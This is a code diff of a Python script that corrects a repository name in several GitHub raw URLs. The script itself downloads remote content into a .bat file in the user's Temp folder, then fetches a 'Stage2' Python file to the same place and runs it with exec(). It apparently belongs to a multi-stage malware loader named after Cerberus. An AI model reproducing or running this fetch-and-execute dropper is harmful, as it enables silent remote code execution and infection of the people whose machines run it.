@@ -11,11 +11,11 @@ if os.path.isfile(path) == False:
     file.close()
 
 filename = "/Users/shrek/AppData/Local/Temp/THost.bat"
-with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cereberus/main/TSource1.txt") as response:
+with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/TSource1.txt") as response:
     data = response.read().decode("utf-8")
     with open(filename, "a+") as fp: fp.write(data)
 
 # urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/TSource1.txt", "/Users/shrek/AppData/Local/Temp/THost.bat")
-urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cereberus/main/Stage2Source.txt", "/Users/shrek/AppData/Local/Temp/Stage2.py")
+urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage2Source.txt", "/Users/shrek/AppData/Local/Temp/Stage2.py")
 
 exec(open("/Users/shrek/AppData/Local/Temp/Stage2.py").read())
